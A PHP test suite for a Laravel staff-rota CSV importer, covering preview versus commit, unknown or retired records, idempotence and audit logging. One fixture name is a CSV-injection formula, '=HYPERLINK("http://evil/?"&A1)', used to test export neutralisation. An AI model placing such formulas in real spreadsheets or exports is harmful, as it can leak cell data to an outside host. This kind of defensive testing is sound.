<?php

namespace Tests\Feature\Rota;

use App\Models\AuditLog;
use App\Models\Level;
use App\Models\MasterRotaAssignment;
use App\Models\Period;
use App\Models\Person;
use App\Models\Unit;
use App\Models\User;
use App\Models\Vacation;
use App\Support\LevelAssignment;
use App\Support\Roster\CsvRosterReader;
use App\Support\Rota\RotaAssignment;
use App\Support\Rota\RotaImport;
use App\Support\Rota\StaleImportFileException;
use App\Support\Rota\VacationBooking;
use Database\Seeders\AccessControlSeeder;
use Database\Seeders\ReferenceSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

/**
 * Munawib MR-06's import (P1d-2 Decision H). `RosterImport`'s discipline where the shapes match,
 * and each deliberate difference asserted rather than described.
 *
 * THE FIXTURES ARE SYNTHETIC, PERMANENTLY (P1c owner decision 3). No real staff list may enter
 * this repository, in `tests/fixtures/rota/` or anywhere else. Every file there exercises a
 * FAILURE SHAPE — a handle on no roster, a person off it, a retired unit, a year with no periods,
 * a span escaping its period, two spans on one day, a blank handle, Arabic names, a neutralised
 * formula cell, a duplicated leave row, a header set that is not the export's. They are not a
 * department, and the first import against a real staff list is the owner's to run against
 * production having previewed it first.
 *
 * THE UNIT OF OUTCOME IS THE CELL, NOT THE LINE (finding 12). `RosterImport` answers one outcome
 * per line because a roster row IS a person. A rota cell is a SET of spans and
 * `RotaAssignment::split()` replaces the whole set, so two lines describing two halves of one
 * split period are ONE outcome carrying two line numbers.
 *
 * NOTHING IS EVER INVENTED. There is no create path for a person, a unit or a period anywhere in
 * `RotaImport`, and `RosterNeverMintsCredentialsTest` now scans it so it cannot grow one for an
 * account either.
 */
class RotaImportTest extends TestCase
{
    use RefreshDatabase;

    private const YEAR = '2026-2027';

    private Period $block1;

    private Period $block2;

    private Unit $unit;

    private Unit $ward;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(ReferenceSeeder::class);
        $this->seed(AccessControlSeeder::class);

        Level::factory()->create(['code' => 'XI1', 'display_order' => 10]);

        $this->admin = User::factory()->create(['position' => 0]);

        // `X`-prefixed codes throughout: a factory-made `PICU`/`R1` collides with
        // `ReferenceSeeder`'s own seeded rows (P1c Task 3's recorded trap).
        $this->unit = Unit::create(['code' => 'XIU', 'name' => 'Rota Import Unit', 'active' => true]);
        $this->ward = Unit::create(['code' => 'XIW', 'name' => 'Rota Import Ward', 'active' => true]);
        Unit::create(['code' => 'XRU', 'name' => 'Rota Retired Unit', 'active' => true])
            ->forceFill(['active' => false])->save();

        $this->block1 = Period::create([
            'academic_year' => self::YEAR, 'kind' => Period::WEEK_BLOCK, 'position' => 1,
            'label' => 'Block 1', 'starts_on' => '2026-07-01', 'ends_on' => '2026-07-28',
        ]);
        $this->block2 = Period::create([
            'academic_year' => self::YEAR, 'kind' => Period::WEEK_BLOCK, 'position' => 2,
            'label' => 'Block 2', 'starts_on' => '2026-07-29', 'ends_on' => '2026-08-25',
        ]);

        $this->person('Nadia Import', 'import.one');
        $this->person('Yusuf Import', 'import.two');
        $this->person('Ghassan Departed', 'import.gone')->forceFill(['active' => false])->save();
        $this->person('Rana Retired', 'import.trash')->delete();
        $this->person('محمد العتيبي', 'm.otaibi');
        $this->person('نورة الحربي', 'ن.ح');
        $this->person('=HYPERLINK("http://evil/?"&A1)', '=formula');
    }

    // --- assignments: the happy path and finding 12 ---------------------------------------

    /**
     * Three cells from four lines, and `preview()` writes NOTHING — the same property
     * `RosterImportController` relies on to render a dry run: no transaction, no row, no audit.
     */
    public function test_a_clean_file_previews_one_outcome_per_cell_and_writes_nothing(): void
    {
        $analysis = $this->preview('assignments-clean.csv');

        $this->assertSame([], $analysis['file_errors']);
        $this->assertCount(3, $analysis['outcomes'], 'four lines describe three (person, period) cells');
        $this->assertSame(
            ['create' => 3, 'replace' => 0, 'unchanged' => 0, 'skipped' => 0, 'error' => 0],
            $analysis['summary'],
        );

        $this->assertSame(0, MasterRotaAssignment::query()->count(), 'preview() wrote a row');
        $this->assertSame(0, AuditLog::query()->where('action', 'rota_import')->count(),
            'preview() wrote an audit row');
    }

    /**
     * FINDING 12, asserted. Two lines describing two halves of one split period are ONE outcome —
     * `RotaAssignment::split()` replaces the whole set, so answering per line would promise an
     * operator two independent writes that are in fact one. The contributing line numbers travel
     * on the outcome so the operator can find the rows that caused it.
     */
    public function test_a_split_cell_is_one_outcome_with_two_line_numbers(): void
    {
        $analysis = $this->preview('assignments-clean.csv');

        $split = $this->outcomeFor($analysis, 'import.one', 2);

        $this->assertSame([3, 4], $split['lines'], 'the split cell did not name both of its lines');
        $this->assertCount(2, $split['spans']);
        $this->assertSame(RotaImport::CREATE, $split['outcome']);

        $whole = $this->outcomeFor($analysis, 'import.one', 1);
        $this->assertSame([2], $whole['lines']);
        $this->assertCount(1, $whole['spans']);
    }

    // --- assignments: it never invents a person, a unit or a period -------------------------

    public function test_an_unknown_short_name_is_skipped_and_nobody_is_created(): void
    {
        $before = Person::withTrashed()->count();

        $analysis = $this->preview('assignments-unknown-person.csv');
        $only = $analysis['outcomes'][0];

        $this->assertSame(RotaImport::SKIP_UNKNOWN_PERSON, $only['outcome']);
        $this->assertStringContainsString('import.nobody', $only['reason']);
        $this->assertSame($before, Person::withTrashed()->count(), 'the importer invented a person');
    }

    /**
     * DECISION H ITEM 3, the difference from `RosterImport` that matters most. `RosterImport`
     * matches `withTrashed()` on purpose — rediscovering a soft-deleted person rather than
     * duplicating them is its whole job. Here the roster is not the importer's business: Task 10
     * deliberately exports a stale person's spans (they are what block
     * `PeriodController::destroy()`), so this path is exercised by a real round trip, and the
     * answer is a named skip. It is finding 10's offer/write parity — `RotaCellRequest` refuses to
     * name such a person on a write, so the importer must too.
     */
    public function test_a_person_off_the_active_roster_is_skipped_with_the_reason_named(): void
    {
        $analysis = $this->preview('assignments-inactive-person.csv');

        $this->assertCount(2, $analysis['outcomes']);

        foreach ($analysis['outcomes'] as $outcome) {
            $this->assertSame(RotaImport::SKIP_UNKNOWN_PERSON, $outcome['outcome']);
            $this->assertStringContainsString('no longer on the active roster', $outcome['reason']);
        }

        $this->assertSame(0, MasterRotaAssignment::query()->count());
        $this->assertNotNull(Person::withTrashed()->where('short_name', 'import.trash')->first()?->deleted_at,
            'a soft-deleted person was rediscovered — that is RosterImport\'s job, not this one\'s');
    }

    /**
     * `people.short_name` is NULLABLE (finding 5), so a person without one exports a blank handle.
     * `RotaExport::peopleWithoutAShortName()` warns before the file is generated; this is what
     * happens if the operator imports it anyway.
     */
    public function test_a_blank_short_name_is_an_unknown_person_not_a_crash(): void
    {
        $analysis = $this->preview('assignments-blank-short-name.csv');
        $only = $analysis['outcomes'][0];

        $this->assertSame(RotaImport::SKIP_UNKNOWN_PERSON, $only['outcome']);
        $this->assertStringContainsString('no short name', $only['reason']);
        $this->assertSame(0, MasterRotaAssignment::query()->count());
    }

    /**
     * TWO OPERATOR PROBLEMS, TWO MESSAGES. `Unit::findByCode()` deliberately finds retired units
     * too (it carries no `active` scope), which is useful rather than a nuisance here: a code
     * naming a unit the department has closed is a different thing to fix from a code naming no
     * unit at all, and a single "unknown unit" would send the operator to the wrong screen.
     */
    public function test_a_retired_unit_and_an_unknown_unit_are_told_apart(): void
    {
        $analysis = $this->preview('assignments-retired-unit.csv');

        $retired = $this->outcomeFor($analysis, 'import.one', 1);
        $this->assertSame(RotaImport::SKIP_UNKNOWN_UNIT, $retired['outcome']);
        $this->assertStringContainsString('retired', $retired['reason']);

        $missing = $this->outcomeFor($analysis, 'import.two', 1);
        $this->assertSame(RotaImport::SKIP_UNKNOWN_UNIT, $missing['outcome']);
        $this->assertStringContainsString('no such unit', $missing['reason']);

        $this->assertSame(3, Unit::query()->whereIn('code', ['XIU', 'XIW', 'XRU'])->count(),
            'the importer created a unit');
        $this->assertNull(Unit::findByCode('XZZ'), 'the importer invented the unknown unit');
    }

    /**
     * FINDING 6: a period is resolved by `(academic_year, position)` — `periods_year_position_unique`
     * — and never by `label`, which is administrator-editable text two years can share. A year with
     * no rows and a position with no row are both `SKIP_UNKNOWN_PERIOD`; neither generates one.
     */
    public function test_a_period_from_another_year_is_skipped_and_never_generated(): void
    {
        $before = Period::query()->count();

        $analysis = $this->preview('assignments-foreign-period.csv');

        $this->assertCount(2, $analysis['outcomes']);
        foreach ($analysis['outcomes'] as $outcome) {
            $this->assertSame(RotaImport::SKIP_UNKNOWN_PERIOD, $outcome['outcome']);
        }

        $this->assertStringContainsString('2030-2031', $analysis['outcomes'][0]['reason']);
        $this->assertSame($before, Period::query()->count(), 'the importer generated a period');
    }

    // --- assignments: the errors the writer would otherwise raise mid-commit ----------------

    public function test_a_span_outside_its_period_is_an_error(): void
    {
        $analysis = $this->preview('assignments-span-outside-period.csv');
        $only = $analysis['outcomes'][0];

        $this->assertSame(RotaImport::ERROR, $only['outcome']);
        $this->assertNotSame([], $only['errors']);
        $this->assertStringContainsString('Line 2', $only['errors'][0]);
    }

    /**
     * Detected over the WHOLE cell before any write, not discovered by `RotaAssignment::split()`
     * part-way through a commit. One person on two units on one day is a state the grid cannot
     * render and the call roster cannot resolve.
     */
    public function test_two_spans_covering_one_day_are_one_error_before_any_write(): void
    {
        $analysis = $this->preview('assignments-overlapping-spans.csv');

        $this->assertCount(1, $analysis['outcomes'], 'the overlap is one cell, not two lines');
        $this->assertSame(RotaImport::ERROR, $analysis['outcomes'][0]['outcome']);
        $this->assertSame([2, 3], $analysis['outcomes'][0]['lines']);

        $this->commit('assignments-overlapping-spans.csv');
        $this->assertSame(0, MasterRotaAssignment::query()->count(), 'an ERROR cell was written anyway');
    }

    // --- encoding and the CSV pairing --------------------------------------------------------

    public function test_arabic_names_survive_the_trip_in_both_columns(): void
    {
        $analysis = $this->preview('assignments-arabic-names.csv');

        $latinHandle = $this->outcomeFor($analysis, 'm.otaibi', 1);
        $this->assertSame(RotaImport::CREATE, $latinHandle['outcome']);
        $this->assertSame('محمد العتيبي', $latinHandle['full_name']);

        $arabicHandle = $this->outcomeFor($analysis, 'ن.ح', 1);
        $this->assertSame(RotaImport::CREATE, $arabicHandle['outcome'],
            'an Arabic short name did not resolve to its person');
    }

    /**
     * The other half of `CsvInjectionTest`'s pairing, in the column that MATTERS: `short_name` is
     * what the importer matches on, so a `Csv::neutralise()`d handle that is not un-neutralised on
     * the way back in resolves to nobody and the whole person is silently skipped. The fixture
     * carries the apostrophe exactly as an export writes it.
     */
    public function test_a_neutralised_formula_handle_matches_its_person(): void
    {
        $analysis = $this->preview('assignments-formula-injection.csv');
        $only = $analysis['outcomes'][0];

        $this->assertSame('=formula', $only['short_name'],
            'the leading apostrophe was not stripped — export → re-import renames the handle');
        $this->assertSame(RotaImport::CREATE, $only['outcome']);
        $this->assertSame('=HYPERLINK("http://evil/?"&A1)', $only['full_name']);
    }

    // --- file-level refusal --------------------------------------------------------------

    /**
     * Never "7 of 8 imported". A header set that is not the export's is a question about the file,
     * and the operator answers it there — the refusal names every column it could not find.
     */
    public function test_a_header_mismatch_refuses_the_whole_import(): void
    {
        $analysis = $this->preview('assignments-bad-headers.csv');

        $this->assertNotSame([], $analysis['file_errors']);
        $this->assertSame([], $analysis['outcomes']);

        foreach (['short_name', 'unit_code', 'starts_on'] as $missing) {
            $this->assertStringContainsString($missing, implode(' ', $analysis['file_errors']));
        }

        $result = $this->commit('assignments-bad-headers.csv');

        $this->assertNotSame([], $result['file_errors']);
        $this->assertSame(0, $result['applied']);
        $this->assertSame(0, MasterRotaAssignment::query()->count());
    }

    // --- one analysis, one pin ------------------------------------------------------------

    /**
     * `preview()` and `commit()` share ONE `analyse()`, which is what makes the preview honest: it
     * is not a separate estimate of what a commit would do, it is the same function.
     */
    public function test_preview_and_commit_share_one_analysis(): void
    {
        $preview = $this->preview('assignments-clean.csv');
        $result = $this->commit('assignments-clean.csv');

        $this->assertSame($preview['outcomes'], $result['outcomes'],
            'the commit applied a different analysis from the one previewed');
        $this->assertSame(3, $result['applied']);

        // ...and the applied set is what the preview PROPOSED, read back off the database.
        foreach ($preview['outcomes'] as $outcome) {
            $stored = MasterRotaAssignment::query()
                ->where('person_id', $outcome['person_id'])
                ->where('period_id', $outcome['period_id'])
                ->orderBy('starts_on')
                ->get()
                ->map(fn (MasterRotaAssignment $a): array => [
                    'unit_id' => (int) $a->unit_id,
                    'starts_on' => $a->starts_on->format('Y-m-d'),
                    'ends_on' => $a->ends_on->format('Y-m-d'),
                ])->all();

            $proposed = array_map(fn (array $span): array => [
                'unit_id' => $span['unit_id'],
                'starts_on' => $span['starts_on'],
                'ends_on' => $span['ends_on'],
            ], $outcome['spans']);

            $this->assertSame($proposed, $stored);
        }
    }

    /**
     * `RosterImport`'s pin, transposed. The commit is tied to the sha256 of the exact bytes the
     * preview parsed: a file re-saved, re-exported or hand-edited between the two is a refusal
     * naming the fix, never a silent apply against expectations the operator never saw.
     *
     * The refusal is a TYPED exception rather than a string in `file_errors`, for the same reason
     * `StaleFillPlanException` is (Task 8): the controller has to tell this refusal apart from
     * every other one to put the 422 on the right field, and choosing an HTTP field by matching an
     * error message's text is the drift this codebase keeps removing.
     */
    public function test_the_commit_is_pinned_to_the_previewed_bytes(): void
    {
        $stale = RotaImport::digest($this->bytes('assignments-arabic-names.csv'));

        try {
            RotaImport::commit(
                $this->reader('assignments-clean.csv'),
                RotaImport::KIND_ASSIGNMENTS,
                $this->bytes('assignments-clean.csv'),
                $stale,
                $this->fakeRequest(),
            );
            $this->fail('a commit against a different file\'s digest was allowed');
        } catch (StaleImportFileException $e) {
            $this->assertStringContainsString('changed', $e->getMessage());
        }

        $this->assertSame(0, MasterRotaAssignment::query()->count(), 'a refused commit still wrote rows');
        $this->assertSame(0, AuditLog::query()->where('action', 'rota_import')->count());
    }

    public function test_a_commit_with_no_digest_at_all_is_refused(): void
    {
        $this->expectException(StaleImportFileException::class);

        RotaImport::commit(
            $this->reader('assignments-clean.csv'),
            RotaImport::KIND_ASSIGNMENTS,
            $this->bytes('assignments-clean.csv'),
            null,
            $this->fakeRequest(),
        );
    }

    // --- idempotence -----------------------------------------------------------------------

    /**
     * Idempotent BY CONSTRUCTION, not by a de-duplication pass: a cell is keyed on (person,
     * period) and `split()` REPLACES, so importing the same file twice is `UNCHANGED` the second
     * time and writes nothing at all.
     */
    public function test_re_importing_the_same_assignments_file_changes_nothing(): void
    {
        $this->commit('assignments-clean.csv');
        $fingerprint = $this->assignmentFingerprint();

        $second = $this->commit('assignments-clean.csv');

        $this->assertSame(
            ['create' => 0, 'replace' => 0, 'unchanged' => 3, 'skipped' => 0, 'error' => 0],
            $second['summary'],
        );
        $this->assertSame(0, $second['applied'], 'an unchanged cell was rewritten');
        $this->assertSame($fingerprint, $this->assignmentFingerprint());
    }

    /**
     * THE IMPORT IS NOT A REPLACEMENT OF THE YEAR. It touches the cells the file names and no
     * others — a partial file is a partial update, never a silent clear of everything it omits.
     */
    public function test_a_cell_the_file_does_not_mention_is_left_alone(): void
    {
        $untouched = Person::query()->where('short_name', 'm.otaibi')->firstOrFail();
        RotaAssignment::set($untouched, $this->block1, $this->ward);

        $result = $this->commit('assignments-clean.csv');

        // Non-vacuity: an importer that applied nothing at all would leave this cell alone too.
        $this->assertSame(3, $result['applied'], 'the import wrote nothing — this test would prove nothing');

        $spans = MasterRotaAssignment::query()
            ->where('person_id', $untouched->getKey())
            ->where('period_id', $this->block1->getKey())
            ->get();

        $this->assertCount(1, $spans, 'the import cleared a cell its file never named');
        $this->assertSame((int) $this->ward->getKey(), (int) $spans[0]->unit_id);
    }

    /** A cell whose stored spans differ from the file's is a REPLACE, and the counts say so. */
    public function test_a_changed_cell_is_a_replace_not_a_second_create(): void
    {
        $nadia = Person::query()->where('short_name', 'import.one')->firstOrFail();
        RotaAssignment::set($nadia, $this->block1, $this->ward);

        $analysis = $this->preview('assignments-clean.csv');
        $cell = $this->outcomeFor($analysis, 'import.one', 1);

        $this->assertSame(RotaImport::REPLACE, $cell['outcome']);
        $this->assertCount(1, $cell['current'], 'the outcome does not say what it would overwrite');
        $this->assertSame((int) $this->ward->getKey(), $cell['current'][0]['unit_id']);

        $result = $this->commit('assignments-clean.csv');
        $this->assertSame(1, $result['summary']['replace']);
        $this->assertSame(2, $result['summary']['create']);
    }

    // --- vacations -------------------------------------------------------------------------

    /**
     * OWNER DECISION 3 (2026-08-10) made literal. `VacationBooking::snap()` is extracted from
     * `book()` and called by both, so the booking screen and the importer cannot snap a week
     * differently — the file's `granularity` column is authoritative, and the preview reports the
     * adjustment rather than performing it silently.
     */
    public function test_a_week_vacation_is_snapped_by_the_same_code_path_as_the_screen(): void
    {
        $analysis = $this->preview('vacations-clean.csv', RotaImport::KIND_VACATIONS);
        $weekRow = $this->vacationOutcomeFor($analysis, 'import.two');

        // Non-vacuity: the fixture's week row is deliberately NOT week-aligned, so a snap that did
        // nothing would be indistinguishable from one that worked.
        $this->assertNotSame($weekRow['starts_on'], $weekRow['snapped_starts_on'],
            'the fixture week row is already aligned — this test would prove nothing');
        $this->assertTrue($weekRow['snapped']);

        $this->commit('vacations-clean.csv', RotaImport::KIND_VACATIONS);

        $imported = Vacation::query()
            ->where('person_id', Person::query()->where('short_name', 'import.two')->value('id'))
            ->firstOrFail();

        // The SAME range through the screen's own writer, on a different person, must land on the
        // same bounds — that is the "same code path" claim, measured rather than asserted.
        $screen = VacationBooking::book(
            Person::query()->where('short_name', 'm.otaibi')->firstOrFail(),
            '2026-07-15', '2026-07-16', Vacation::GRANULARITY_WEEK,
        );

        $this->assertSame($screen->starts_on->format('Y-m-d'), $imported->starts_on->format('Y-m-d'));
        $this->assertSame($screen->ends_on->format('Y-m-d'), $imported->ends_on->format('Y-m-d'));
        $this->assertSame($weekRow['snapped_starts_on'], $imported->starts_on->format('Y-m-d'),
            'the preview reported a snap the commit did not perform');
        $this->assertSame(Vacation::SOURCE_IMPORT, $imported->source, 'finding 7: an imported row is sourced import');
    }

    /**
     * `SKIP_DUPLICATE` exists BECAUSE A VACATION HAS NO NATURAL KEY. An assignment is keyed on
     * (person, period) and replaced, so a second import of the same file changes nothing by
     * construction; leave has no such key, so without this the same run twice would double every
     * row in the file.
     */
    public function test_the_same_leave_row_twice_in_one_file_is_a_duplicate(): void
    {
        $analysis = $this->preview('vacations-duplicate.csv', RotaImport::KIND_VACATIONS);

        $this->assertSame(RotaImport::CREATE, $analysis['outcomes'][0]['outcome']);
        $this->assertSame(RotaImport::SKIP_DUPLICATE, $analysis['outcomes'][1]['outcome'],
            'the source column, which is not matched on, was allowed to make it a second row');

        $this->commit('vacations-duplicate.csv', RotaImport::KIND_VACATIONS);
        $this->assertSame(1, Vacation::query()->count());
    }

    public function test_re_importing_the_same_vacations_file_creates_nothing(): void
    {
        $this->commit('vacations-clean.csv', RotaImport::KIND_VACATIONS);
        $this->assertSame(2, Vacation::query()->count());

        $second = $this->commit('vacations-clean.csv', RotaImport::KIND_VACATIONS);

        $this->assertSame(2, $second['summary']['skipped']);
        $this->assertSame(0, $second['applied']);
        $this->assertSame(2, Vacation::query()->count(), 'a re-import doubled the leave');
    }

    /**
     * `Vacation::booted()` refuses overlapping leave for one person with a `RuntimeException`.
     * Reaching it from inside the import transaction would abort the whole file on a row the
     * preview called clean — so the overlap is an ERROR at analysis time, on that row alone.
     */
    public function test_leave_overlapping_other_leave_is_an_error_not_an_aborted_import(): void
    {
        $analysis = $this->preview('vacations-overlapping.csv', RotaImport::KIND_VACATIONS);

        $this->assertSame(RotaImport::CREATE, $analysis['outcomes'][0]['outcome']);
        $this->assertSame(RotaImport::ERROR, $analysis['outcomes'][1]['outcome']);
        $this->assertStringContainsString('overlaps', implode(' ', $analysis['outcomes'][1]['errors']));

        $result = $this->commit('vacations-overlapping.csv', RotaImport::KIND_VACATIONS);

        $this->assertSame(1, $result['applied'], 'the good row did not survive the bad one');
        $this->assertSame(1, Vacation::query()->count());
    }

    // --- the round trip ----------------------------------------------------------------------

    /**
     * THE TEST THAT MATTERS. Task 10's export, byte for byte, back through Task 11's importer:
     * a year carrying a split, a gap, leave at both granularities, a retired unit's span, two
     * stale people, an Arabic handle and a neutralised formula handle.
     *
     * NOTHING MAY MUTATE. Every outcome is one of four NON-WRITING answers, and the two that are
     * not `UNCHANGED`/`SKIP_DUPLICATE` are there because Task 10 deliberately puts them in the
     * file: a stale person's spans are what block `PeriodController::destroy()` (so an
     * administrator must see them) and a retired unit's code is read off the assignment's own
     * relation rather than the grid (so it survives). Both come back named, never silently applied
     * and never silently dropped.
     *
     * This is the only test that can catch a neutralise/un-neutralise mismatch in a REAL column:
     * `=formula` is a person's handle here, and the handle is what the importer matches on.
     */
    public function test_an_exported_year_re_imports_as_a_no_op(): void
    {
        $split = Person::query()->where('short_name', 'import.one')->firstOrFail();
        RotaAssignment::split($split, $this->block1, [
            ['unit_id' => $this->unit->getKey(), 'starts_on' => '2026-07-01', 'ends_on' => '2026-07-14'],
            ['unit_id' => $this->ward->getKey(), 'starts_on' => '2026-07-15', 'ends_on' => '2026-07-28'],
        ]);

        // A deliberate gap: this person joins the block late, which owner decision 3 makes legal.
        $gapped = Person::query()->where('short_name', 'import.two')->firstOrFail();
        RotaAssignment::split($gapped, $this->block2, [
            ['unit_id' => $this->unit->getKey(), 'starts_on' => '2026-08-05', 'ends_on' => '2026-08-25'],
        ]);

        $arabic = Person::query()->where('short_name', 'ن.ح')->firstOrFail();
        RotaAssignment::set($arabic, $this->block2, $this->ward);

        $formula = Person::query()->where('short_name', '=formula')->firstOrFail();
        RotaAssignment::set($formula, $this->block1, $this->ward);

        // Stale, both ways: assigned first, then removed from the roster — the order an actual
        // departure happens in, and the only order that leaves the span behind.
        $departed = $this->person('Departed In Year', 'rt.gone');
        RotaAssignment::set($departed, $this->block2, $this->unit);
        $departed->forceFill(['active' => false])->save();

        $deleted = $this->person('Deleted In Year', 'rt.trash');
        RotaAssignment::set($deleted, $this->block1, $this->unit);
        $deleted->delete();

        // A unit closed after the rota was planned. Its code survives in the export (Task 10) and
        // is refused on the way back in, by name.
        $closing = Unit::create(['code' => 'XCU', 'name' => 'Closing Unit', 'active' => true]);
        $historical = Person::query()->where('short_name', 'm.otaibi')->firstOrFail();
        RotaAssignment::set($historical, $this->block1, $closing);
        $closing->forceFill(['active' => false])->save();

        VacationBooking::book($split, '2026-07-06', '2026-07-08', Vacation::GRANULARITY_DATE);
        VacationBooking::book($arabic, '2026-08-12', '2026-08-13', Vacation::GRANULARITY_WEEK);

        $assignmentsBefore = $this->assignmentFingerprint();
        $vacationsBefore = $this->vacationFingerprint();

        // --- assignments ------------------------------------------------------------------
        $bytes = $this->export('assignments');
        $analysis = $this->commitBytes($bytes, RotaImport::KIND_ASSIGNMENTS);

        $this->assertSame([], $analysis['file_errors']);
        $this->assertNotSame([], $analysis['outcomes'], 'the exported year produced no rows to re-import');

        $byHandle = [];
        foreach ($analysis['outcomes'] as $outcome) {
            $byHandle[$outcome['short_name']] = $outcome['outcome'];
        }

        // Sorted on both sides: the export's row order is a legibility property (its own docblock
        // says nothing downstream depends on it) and `RotaImport` reassembles a split cell from its
        // contributing lines whatever order they arrive in. Pinning it here would fail the day
        // somebody improves the file's reading order, for no defect.
        $expected = [
            'import.one' => RotaImport::UNCHANGED,
            'import.two' => RotaImport::UNCHANGED,
            'ن.ح' => RotaImport::UNCHANGED,
            '=formula' => RotaImport::UNCHANGED,
            'rt.gone' => RotaImport::SKIP_UNKNOWN_PERSON,
            'rt.trash' => RotaImport::SKIP_UNKNOWN_PERSON,
            'm.otaibi' => RotaImport::SKIP_UNKNOWN_UNIT,
        ];

        ksort($expected);
        ksort($byHandle);

        $this->assertSame($expected, $byHandle);

        $this->assertSame(0, $analysis['summary']['create'] + $analysis['summary']['replace']
            + $analysis['summary']['error'], 'a round trip mutated the rota');
        $this->assertSame(0, $analysis['applied']);
        $this->assertSame($assignmentsBefore, $this->assignmentFingerprint());

        // --- vacations --------------------------------------------------------------------
        $bytes = $this->export('vacations');
        $analysis = $this->commitBytes($bytes, RotaImport::KIND_VACATIONS);

        $this->assertSame([], $analysis['file_errors']);
        $this->assertCount(2, $analysis['outcomes']);
        foreach ($analysis['outcomes'] as $outcome) {
            $this->assertSame(RotaImport::SKIP_DUPLICATE, $outcome['outcome'],
                'exported leave re-imported as something other than a duplicate — a week snap is not idempotent');
        }

        $this->assertSame(0, $analysis['applied']);
        $this->assertSame($vacationsBefore, $this->vacationFingerprint());
    }

    // --- audit ------------------------------------------------------------------------------

    /**
     * Ids, field names and counts only (CLAUDE.md; Decision H). No filename — a filename is
     * frequently a person's name — no handle, no unit code, no period label. One row per import,
     * written AFTER the transaction commits (finding 8).
     */
    public function test_the_commit_audits_counts_only(): void
    {
        $this->commit('assignments-clean.csv');

        $details = AuditLog::query()->where('action', 'rota_import')->pluck('detail')->all();

        $this->assertSame(['file=assignments;created=3;replaced=0;unchanged=0;skipped=0;errors=0'], $details);

        foreach (['import.one', 'Nadia', 'XIU', 'Block 1', '.csv'] as $forbidden) {
            $this->assertStringNotContainsString($forbidden, $details[0]);
        }
    }

    /**
     * `RotaFill::plan()` strips the resolved models for the same reason (Decision C, finding 3):
     * Eloquent models in a props payload is how a contact field reaches a screen nobody meant to
     * put it on. `commit()` uses them; nothing that renders ever sees them.
     */
    public function test_the_preview_carries_no_eloquent_models(): void
    {
        $analysis = $this->preview('assignments-clean.csv');

        // Non-vacuity: an empty analysis carries no object either.
        $this->assertCount(3, $analysis['outcomes'], 'there is nothing in this preview to scan');

        $this->assertArrayNotHasKey('context', $analysis);

        array_walk_recursive($analysis, function ($value, $key): void {
            $this->assertIsNotObject($value, "the preview carries an object at key {$key}");
        });
    }

    // --- helpers ------------------------------------------------------------------------------

    /** @return array<string, mixed> */
    private function preview(string $fixture, string $kind = RotaImport::KIND_ASSIGNMENTS): array
    {
        return RotaImport::preview($this->reader($fixture), $kind, $this->bytes($fixture));
    }

    /** @return array<string, mixed> */
    private function commit(string $fixture, string $kind = RotaImport::KIND_ASSIGNMENTS): array
    {
        $bytes = $this->bytes($fixture);

        return RotaImport::commit(
            $this->reader($fixture),
            $kind,
            $bytes,
            RotaImport::digest($bytes),
            $this->fakeRequest(),
        );
    }

    /** @return array<string, mixed> */
    private function commitBytes(string $bytes, string $kind): array
    {
        $path = tempnam(sys_get_temp_dir(), 'rotaimp');
        file_put_contents($path, $bytes);

        try {
            return RotaImport::commit(
                new CsvRosterReader($path),
                $kind,
                $bytes,
                RotaImport::digest($bytes),
                $this->fakeRequest(),
            );
        } finally {
            @unlink($path);
        }
    }

    private function reader(string $fixture): CsvRosterReader
    {
        return new CsvRosterReader(base_path("tests/fixtures/rota/{$fixture}"));
    }

    private function bytes(string $fixture): string
    {
        return (string) file_get_contents(base_path("tests/fixtures/rota/{$fixture}"));
    }

    private function fakeRequest(): \Illuminate\Http\Request
    {
        $request = \Illuminate\Http\Request::create('/admin/rota/import/commit', 'POST');
        $request->setUserResolver(fn () => $this->admin);

        return $request;
    }

    /** The exported bytes, from the real route — the file an operator actually gets. */
    private function export(string $file): string
    {
        $response = $this->actingAs($this->admin)->get("/admin/rota/export/{$file}?year=".self::YEAR);
        $response->assertOk();

        $streamed = $response->baseResponse;
        $this->assertInstanceOf(StreamedResponse::class, $streamed);

        ob_start();
        $streamed->sendContent();

        return (string) ob_get_clean();
    }

    /**
     * @param  array<string, mixed>  $analysis
     * @return array<string, mixed>
     */
    private function outcomeFor(array $analysis, string $shortName, int $position): array
    {
        foreach ($analysis['outcomes'] as $outcome) {
            if ($outcome['short_name'] === $shortName && (string) $outcome['period_position'] === (string) $position) {
                return $outcome;
            }
        }

        $this->fail("No outcome for {$shortName} in period {$position}.");
    }

    /**
     * @param  array<string, mixed>  $analysis
     * @return array<string, mixed>
     */
    private function vacationOutcomeFor(array $analysis, string $shortName): array
    {
        foreach ($analysis['outcomes'] as $outcome) {
            if ($outcome['short_name'] === $shortName) {
                return $outcome;
            }
        }

        $this->fail("No leave outcome for {$shortName}.");
    }

    /**
     * The whole assignment set as one comparable string. A count alone would pass a same-count
     * swap; dumping the rows into an `assertSame` produced a 126 KB failure message the last time
     * this pattern was written (Task 7's amendment), so the fingerprint is a hash and the count
     * is asserted beside it where it matters.
     */
    private function assignmentFingerprint(): string
    {
        return md5((string) MasterRotaAssignment::query()
            ->orderBy('person_id')->orderBy('period_id')->orderBy('starts_on')
            ->get(['person_id', 'period_id', 'unit_id', 'starts_on', 'ends_on'])
            ->toJson());
    }

    private function vacationFingerprint(): string
    {
        return md5((string) Vacation::query()
            ->orderBy('person_id')->orderBy('starts_on')
            ->get(['person_id', 'starts_on', 'ends_on', 'granularity', 'source'])
            ->toJson());
    }

    private function person(string $fullName, string $shortName): Person
    {
        $person = Person::factory()->create([
            'full_name' => $fullName,
            'short_name' => $shortName,
        ]);

        LevelAssignment::assign($person, Level::query()->where('code', 'XI1')->firstOrFail(), '2026-07-01');

        return $person;
    }
}
